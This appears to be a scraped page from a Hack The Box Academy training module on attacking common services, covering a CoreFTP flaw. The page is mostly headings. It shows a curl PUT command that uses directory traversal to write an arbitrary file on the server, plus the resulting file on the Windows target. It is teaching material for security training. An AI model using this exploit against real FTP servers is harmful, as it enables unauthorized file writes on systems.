<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/116/section/1166
// Platform Version: V1
// Module ID: 116
// Module Name: Attacking Common Services
// Module Difficulty: Medium
// Section ID: 1166
// Section Title: Latest FTP Vulnerabilities
// Page Title: Attacking Common Services
// Page Number: 06
-->

# Latest FTP Vulnerabilities

**Module Name:** Attacking Common Services **Page Number:** 06

#### ATTACKING COMMON SERVICES

# Latest FTP Vulnerabilities

## The Concept of the Attack

#### CoreFTP Exploitation

``` shell-session
[!bash!]$ curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

#### The Concept of Attacks

![https://academy.hackthebox.com/storage/modules/116/attack_concept2.png](https://academy.hackthebox.com/storage/modules/116/attack_concept2.png)

#### Directory Traversal

#### Arbitrary File Write

#### Target System

``` cmd-session
C:\> type C:\whoops

PoC.
```

####